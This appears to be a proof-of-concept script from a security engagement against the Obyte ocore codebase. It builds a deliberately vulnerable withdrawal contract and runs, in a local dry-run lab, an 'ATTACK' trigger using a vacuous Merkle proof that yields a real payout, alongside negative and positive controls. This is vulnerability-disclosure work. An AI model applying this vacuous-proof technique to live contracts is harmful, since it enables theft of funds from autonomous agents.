// E2-2 — Vulnerable-AA demonstration (F1 fund-impact class)
// Build a realistic whitelist-gated AA ("withdraw only if you prove merkle-tree membership"),
// call the withdrawal with the VACUOUS merkle proof, and show the AA composes a real payout.
// Real path: aa_composer.dryRunPrimaryAATrigger (the exact entry the wallet/test suite uses to
// evaluate an AA trigger and compose its response).
// Boot: e17b-boot saves genesis through validation.validate -> writer.saveJoint (no extra saves,
// so the MC machinery settles immediately). The dryRun's last-stable-MC-unit precondition is met
// by ONE schema-exact seeded unit (last_ball_unit = genesis, is_stable=1) — direct INSERTs, no
// writer saves, no background MC machinery, no cache/DB race (the p2-seed convention).
// Run: cd /Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore && node <abs>/e2-2-vuln-aa.js
"use strict";
const path = require("path");
const crypto = require("crypto");
const { boot, keys, TOTAL, O_CORE, sleep } = require("/Users/matheusvsky/Documents/trab/llm-redteam-harness/engagements/obyte-ocore-2026-08/evidence/lab/e17b-boot.js");

async function main() {
  const ctx = await boot(path.join(__dirname, ".e2-2data"), 16622, {});
  const { db, storage, validation, objectHash, composer, constants, keys, user_addr, witness_addr, composeUnit } = ctx;
  const util = require("util");
  const aa_composer = require(O_CORE + "/aa_composer.js");
  const aa_validation = require(O_CORE + "/aa_validation.js");
  const merkle = require(O_CORE + "/merkle.js");
  const mutex_mod = require(O_CORE + "/mutex.js");
  const kvstore = require(O_CORE + "/kvstore.js");
  const objectLength = require(O_CORE + "/object_length.js");
  const ecdsaSig = require(O_CORE + "/signature.js");
  const ecdsa = require(O_CORE + "/node_modules/secp256k1");

  const q = async (label, sql, params) => {
    const conn = await db.takeConnectionFromPool();
    try { const rows = await conn.query(sql, params || []); conn.release(); return rows; }
    catch (e) { conn.release(); throw Error(label + ": " + e); }
  };
  const signHash = (hashBuf, privHex) => Buffer.from(ecdsa.ecdsaSign(hashBuf, Buffer.from(privHex, "hex")).signature).toString("base64");

  // --- seed ONE stable MC unit (schema-exact) so the dryRun's precondition holds ---
  // COMPOSE it with the real composer (canonical hash/signature/commissions), then insert ONLY the
  // SQL rows + kvstore joint directly (no writer save -> no background MC machinery -> no race).
  const mcJoint = await composeUnit(keys.user, user_addr, "MC"); // real composer path
  const mcUnit = mcJoint.unit; // the unit object; the hash is mcUnit.unit
  const mcBall = objectHash.getBallHash(mcUnit.unit);
  const kvbatch = kvstore.batch();
  kvbatch.put("j\n" + mcUnit.unit, JSON.stringify(mcUnit));
  await util.promisify(kvbatch.write.bind(kvbatch))({ sync: true });
  await q("units", "INSERT OR IGNORE INTO units (unit, version, alt, timestamp, headers_commission, payload_commission, is_free, is_on_main_chain, main_chain_index, latest_included_mc_index, level, witnessed_level, is_stable, sequence, best_parent_unit, last_ball_unit) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
    [mcUnit.unit, mcUnit.version, mcUnit.alt, mcUnit.timestamp, mcUnit.headers_commission, mcUnit.payload_commission, 1, 1, 1, 1, 1, 1, 1, "good", mcUnit.last_ball_unit, mcUnit.last_ball_unit]);
  await q("parenthoods", "INSERT OR IGNORE INTO parenthoods (child_unit, parent_unit) VALUES (?,?)", [mcUnit.unit, mcUnit.last_ball_unit]);
  await q("addr-user", "INSERT OR IGNORE INTO addresses (address) VALUES (?)", [user_addr]);
  await q("def-user", "INSERT OR IGNORE INTO definitions (definition_chash, definition, has_references) VALUES (?,?,?)",
    [user_addr, JSON.stringify(["sig", { pubkey: keys.user.pub }]), 0]);
  await q("unit_authors", "INSERT OR IGNORE INTO unit_authors (unit, address, definition_chash) VALUES (?,?,?)", [mcUnit.unit, user_addr, user_addr]);
  await q("balls", "INSERT OR IGNORE INTO balls (ball, unit) VALUES (?,?)", [mcBall, mcUnit.unit]);
  console.log("E22 SEEDED-MC-UNIT", mcUnit.unit.slice(0, 12) + "...", "last_ball=" + (mcUnit.last_ball_unit || "?").slice(0, 12) + "...");

  const [stable] = await q("stable", "SELECT unit, main_chain_index FROM units WHERE +is_on_main_chain=1 AND +is_stable=1 ORDER BY main_chain_index DESC LIMIT 1");
  console.log("E22 STABLE-MC-UNIT", stable ? ("mci=" + stable.main_chain_index) : "NONE");

  // --- the vulnerable whitelist-withdrawal AA ---
  const aa = ["autonomous agent", {
    messages: [
      { app: "payment", payload: { asset: "base", outputs: [
        { address: "{trigger.initial_address}",
          amount: "{is_valid_merkle_proof(trigger.data.element, trigger.data.proof) ? trigger.output[[asset=base]] - 1000 : 0}" }
      ] } }
    ]
  }];
  const aa_address = objectHash.getChash160(aa);
  const readGetterProps = (conn, a, f, cb) => cb(null);
  await util.promisify(aa_validation.validateAADefinition)(aa, readGetterProps, Number.MAX_SAFE_INTEGER);
  console.log("E22 AA-DEF-VALID true", aa_address);

  // schema-exact seeds: AA definition row (FK target of aa_balances), address, AA funds
  await q("aa_addresses", "INSERT OR IGNORE INTO aa_addresses (address, unit, mci, storage_size, definition, getters) VALUES (?,?,?,?,?,?)",
    [aa_address, ctx.genesis.unit, 0, 0, JSON.stringify(aa), null]);
  await q("addresses", "INSERT OR IGNORE INTO addresses (address) VALUES (?)", [aa_address]);
  await q("aa_balances", "INSERT OR IGNORE INTO aa_balances (address, asset, balance) VALUES (?,?,?)", [aa_address, "base", 200000]);

  // --- dryRun (callback is single-arg onDone(arrResponses); wrap manually) ---
  const dryRun = (trigger, address, def) => new Promise((resolve) =>
    aa_composer.dryRunPrimaryAATrigger(trigger, address, def, (arrResponses) => resolve(arrResponses)));
  const payoutOf = (arrResponses) => {
    for (const r of arrResponses) {
      const unit = r.objResponseUnit || r.response_unit;
      if (!unit || !unit.messages) continue;
      for (const m of unit.messages) {
        if (m.app !== "payment" || !m.payload || !m.payload.outputs) continue;
        for (const o of m.payload.outputs) {
          if (o.amount && o.amount > 0) return { to: o.address, amount: o.amount, bounced: !!r.bounced };
        }
      }
    }
    const r0 = arrResponses[0];
    return { bounced: !!(r0 && r0.bounced), error: r0 && r0.response && r0.response.error, empty: arrResponses.length === 0, balances: r0 && r0.balances };
  };

  const caller = user_addr;
  const results = await new Promise((resolve) => {
    mutex_mod.lock(["handleJoint", "write"], (unlock) => {
      runScenarios().then(resolve).finally(unlock);
    });
  });
  results.e01ba3e_cap = { note: "sibling cap (evaluation.js:1787-1791) requires >50 siblings AND non-empty strings; vacuous proof has 0 siblings", vacuousProofSiblings: 0, mitigated: false };
  console.log("E22-RESULTS " + JSON.stringify(results));
  process.exit(0);

  async function runScenarios() {
    const results = {};
    const sha256b64 = (s) => crypto.createHash("sha256").update(s, "utf8").digest("base64");
    const X = "attacker-arbitrary-element-42";

    // 1) ATTACK: vacuous proof — element with NO tree membership, proof = "0-" + hash(element)
    const resAttack = await dryRun({ address: caller, outputs: { base: 100000 }, data: { element: X, proof: "0-" + sha256b64(X) } }, aa_address, aa);
    results.attack_vacuous = { payout: payoutOf(resAttack), responses: resAttack.length };

    // 2) NEGATIVE CONTROL: inconsistent proof (root = hash of a DIFFERENT element) — must reject
    const resBad = await dryRun({ address: caller, outputs: { base: 100000 }, data: { element: X, proof: "0-" + sha256b64("some-other-element") } }, aa_address, aa);
    results.negative_inconsistent = { payout: payoutOf(resBad) };

    // 3) POSITIVE CONTROL: a REAL merkle proof from a real tree — passes too (the construct cannot
    //    distinguish "real membership" from self-consistency; the root is prover-supplied either way)
    const tree = ["alice", "bob", "carol", "dave", "eve"];
    const realSerialized = merkle.serializeMerkleProof(merkle.getMerkleProof(tree, 2));
    const resReal = await dryRun({ address: caller, outputs: { base: 100000 }, data: { element: "carol", proof: realSerialized } }, aa_address, aa);
    results.positive_real_member = { payout: payoutOf(resReal) };

    return results;
  }
}

main().catch(e => { console.error("E22-ERR", e); process.exit(1); });
